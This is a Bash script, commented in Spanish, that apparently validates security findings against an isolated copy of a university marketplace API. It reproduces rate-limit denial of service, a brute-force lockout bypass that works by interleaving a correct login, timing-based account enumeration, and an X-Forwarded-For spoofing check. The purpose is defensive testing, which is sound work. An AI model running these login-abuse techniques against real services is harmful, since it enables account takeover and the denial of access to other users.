#!/usr/bin/env bash
# Reproducción manual (SWAP-575) de hallazgos que ZAP no puede confirmar por sí
# solo porque dependen de la lógica de negocio o de la topología del proxy.
# Se ejecuta SOLO contra la copia aislada (red swap_zap_net). Requiere
# "./run-zap.sh up" antes. Cada cliente es un contenedor distinto, con su
# propia IP, para simular usuarios diferentes detrás del mismo nginx.
set -uo pipefail

DIR="$(cd "$(dirname "$0")" && pwd)"
OUT="${1:-$DIR/reports/validacion-$(date +%Y%m%d-%H%M%S).txt}"
RED=swap_zap_net
API=http://swap-zap-nginx/api/v1
CURL_IMG=curlimages/curl:8.10.1
USUARIO='{"email_institucional":"vendedor@uvg.edu.gt","password":"Vendedor123!"}'
VICTIMA_MALA='{"email_institucional":"vendedor123@uvg.edu.gt","password":"incorrecta"}'
INEXISTENTE='{"email_institucional":"no-existe-zap@uvg.edu.gt","password":"incorrecta"}'

mkdir -p "$(dirname "$OUT")"
exec > >(tee "$OUT") 2>&1

cliente() {
    # $1 = nombre del cliente, resto = argumentos de curl
    local nombre="$1"; shift
    docker run --rm --network "$RED" --name "zap-cliente-$nombre-$RANDOM" "$CURL_IMG" -s "$@"
}

rafaga() {
    # $1 = nombre del cliente, $2 = cantidad, $3 = URL, resto = cabeceras extra. Todo desde UNA misma IP.
    local nombre="$1" n="$2" url="$3"; shift 3
    docker run --rm --network "$RED" --entrypoint sh "$CURL_IMG" -c \
        "for i in \$(seq 1 $n); do curl -s -o /dev/null -w '%{http_code}\\n' $* '$url'; done"
}

ip_de() { docker run --rm --network "$RED" "$CURL_IMG" sh -c "hostname -i" 2>/dev/null; }

limpiar_limites() {
    # Limpia el bloqueo de login/códigos (Redis, con TTL propio) entre escenarios.
    # No se reinicia el contenedor de la API: nginx cachea la IP interna al
    # arrancar y no la vuelve a resolver tras un restart, lo que deja el proxy
    # apuntando a una IP muerta (502) hasta que nginx mismo se reinicie.
    # El limitador global en memoria (apiVentanas) no tiene forma de limpiarse
    # sin reiniciar el proceso, así que en vez de eso se espera a que su propia
    # ventana de 60s expire — todos los escenarios usan ventanas de 65s+.
    docker exec swap-zap-redis sh -c "redis-cli --scan --pattern 'rate:*' | xargs -r redis-cli del" >/dev/null 2>&1 || true
    sleep 65
}

echo "Validación de hallazgos — $(date)"
echo "Destino: copia aislada ($API)"
echo

echo "== V1. ¿Con qué IP ve Express a clientes distintos? =="
echo "IPs de dos contenedores cliente distintos en la red: $(ip_de) / $(ip_de)"
echo "Últimas IPs de origen registradas por nginx (remote_addr):"
docker logs swap-zap-nginx 2>/dev/null | awk '{print $1}' | sort | uniq -c | sort -rn | head -5
echo "Express no configura 'trust proxy', así que para él todas llegan desde la IP del proxy."
echo

echo "== V2. Rate limit global compartido entre usuarios (DoS por un solo cliente) =="
limpiar_limites
echo "Cliente A envía 125 peticiones seguidas a /auth/me ..."
rafaga A 125 "$API/auth/me" | sort | uniq -c
echo "Cliente B (otra IP, nunca hizo peticiones) pide /auth/me una sola vez:"
cliente B -o /dev/null -w 'Cliente B -> HTTP %{http_code}\n' "$API/auth/me"
echo "Esperado si es seguro: 401 (sin sesión). Si da 429, el límite de A bloqueó a B."
echo

echo "== V3. Bloqueo de login compartido (DoS de autenticación) =="
limpiar_limites
echo "Cliente A falla 5 veces la contraseña de una cuenta existente (vendedor123@uvg.edu.gt):"
for i in 1 2 3 4 5; do
    cliente A -o /dev/null -w "  intento $i -> HTTP %{http_code}\n" -X POST "$API/auth/login" -H 'Content-Type: application/json' -d "$VICTIMA_MALA"
done
echo "Cliente B (otra IP) inicia sesión con SU contraseña correcta (vendedor@uvg.edu.gt):"
cliente B -w '\nCliente B -> HTTP %{http_code}\n' -o - -X POST "$API/auth/login" -H 'Content-Type: application/json' -d "$USUARIO" | tail -c 160
echo "Esperado si es seguro: 200. Si da 429, 5 errores de un tercero bloquearon el login de todos."
echo

echo "== V4. Evasión de la protección contra fuerza bruta =="
limpiar_limites
echo "El atacante alterna 4 contraseñas incorrectas contra la víctima con 1 login correcto de SU cuenta."
bloqueado=0; total_malos=0
for ronda in 1 2 3 4 5; do
    for _ in 1 2 3 4; do
        c="$(cliente A -o /dev/null -w '%{http_code}' -X POST "$API/auth/login" -H 'Content-Type: application/json' -d "$VICTIMA_MALA")"
        total_malos=$((total_malos + 1)); [ "$c" = "429" ] && bloqueado=1
    done
    c="$(cliente A -o /dev/null -w '%{http_code}' -X POST "$API/auth/login" -H 'Content-Type: application/json' -d "$USUARIO")"
    echo "  ronda $ronda: 4 intentos malos + login propio -> HTTP $c"
done
echo "Contraseñas probadas contra la víctima: $total_malos (el límite es 5 cada 15 min). ¿Llegó a bloquearse? $([ $bloqueado = 1 ] && echo sí || echo no)"
echo "Si no se bloqueó, un login exitoso reinicia el contador y la fuerza bruta es ilimitada."
echo

echo "== V5. Enumeración de cuentas por tiempo de respuesta =="
limpiar_limites
medir() {
    cliente C -o /dev/null -w '%{time_total}\n' -X POST "$API/auth/login" -H 'Content-Type: application/json' -d "$1"
}
echo "Tiempos (s) de 4 intentos con correo EXISTENTE y contraseña incorrecta:"
existente=""; for _ in 1 2 3 4; do t="$(medir "$VICTIMA_MALA")"; existente="$existente $t"; done; echo "  $existente"
limpiar_limites
echo "Tiempos (s) de 4 intentos con correo INEXISTENTE:"
inexistente=""; for _ in 1 2 3 4; do t="$(medir "$INEXISTENTE")"; inexistente="$inexistente $t"; done; echo "  $inexistente"
promedio() { echo "$1" | tr ' ' '\n' | awk 'NF {s+=$1; n++} END {printf "%.4f", s/n}'; }
echo "Promedio existente: $(promedio "$existente") s | inexistente: $(promedio "$inexistente") s"
echo "Una diferencia estable (bcrypt solo corre si el correo existe) permite saber qué correos están registrados."
echo

echo "== V6. ¿Se puede evadir el límite falsificando X-Forwarded-For? =="
limpiar_limites
rafaga A 125 "$API/auth/me" >/dev/null
cliente A -o /dev/null -w 'Con X-Forwarded-For falso -> HTTP %{http_code}\n' -H 'X-Forwarded-For: 203.0.113.9' "$API/auth/me"
echo "429 aquí es lo correcto hoy (la cabecera se ignora). Al corregir V2/V3 con 'trust proxy' hay que confiar SOLO en el proxy propio."
echo
echo "Fin. Evidencia guardada en $OUT"
